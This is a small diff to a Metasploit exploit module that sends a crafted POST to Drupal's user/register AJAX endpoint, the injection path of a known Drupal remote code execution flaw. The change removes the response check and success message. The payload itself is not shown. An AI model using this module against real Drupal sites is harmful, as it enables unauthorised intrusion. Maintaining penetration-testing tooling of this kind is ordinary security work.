@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Exploit::Remote
       post_data = data.to_s
 
       # /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
-      res = send_request_cgi({
+      send_request_cgi({
         'method'   => 'POST',
         'uri'      => "#{uri_path}user/register",
         'ctype'    => "multipart/form-data; boundary=#{data.bound}",
@@ -85,11 +85,6 @@ class MetasploitModule < Msf::Exploit::Remote
           '_wrapper_format' => 'drupal_ajax',
         }
       })
-
-      unless res and res.code == 200
-        fail_with(Failure::Unknown, "The target does not seem to be vulnerable. Returned code #{res.code}")
-      end
-      print_success("The target seems to be vulnerable.")
     end
   
     ##
